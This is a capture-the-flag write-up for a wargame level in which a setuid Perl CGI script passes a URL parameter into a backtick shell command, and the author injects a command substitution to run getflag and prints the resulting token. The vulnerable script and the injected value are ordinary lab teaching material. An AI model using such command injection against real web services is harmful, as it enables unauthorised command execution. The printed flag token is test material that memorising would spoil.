# level04

The first thing we see is we have a Perl script.
```
ls -l
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```
Just like the previous level, we see that the Set User ID and the Set Group ID are set
(allowing us `level04` to run the file like the owner of it `flag04`).

When running it, nothing much happens.
```
./level04.pl 
Content-type: text/html


```

We may get a few infos by using `cat`.
```perl
cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

There are a few things to understand about this Perl script.
```perl
# localhost:4747 # This is how the webserver needs to be run
use CGI qw(param) # the param is imported from the CGI module
print "Content-type: text/html\n\n"; # Informs the web server that the content being sent back to the browser is HTML
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
} # This is a subroutine, it takes the first argument passed and prints it
x(param("x")) # The parameter passed is stored in the variable `x`
```
Since we port forwarded differently, the server will be run using an IP address. 

In a web browser we run it like this : `192.168.56.101:4747`.
At first nothing happens. We then add the script to the address `192.168.56.101:4747/level04.pl` and still nothing happens.
We know we can pass an argument if it's stored in the variable `x` so that's what we'll do.

`192.168.56.101:4747/level04.pl?x=test` displays test on the screen.
We now need to find what to pass to get the flag. We assume it has something to do with the `getflag` command

`192.168.56.101:4747/level04.pl?x=getflag` displays getflag on the screen

In bash, we know that a command can be substituted using `command` or `$(command)`. Since using `command` doesn't work, we're trying using `$(command)`

`192.168.56.101:4747/level04.pl?x=(getflag)` does give us the flag
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
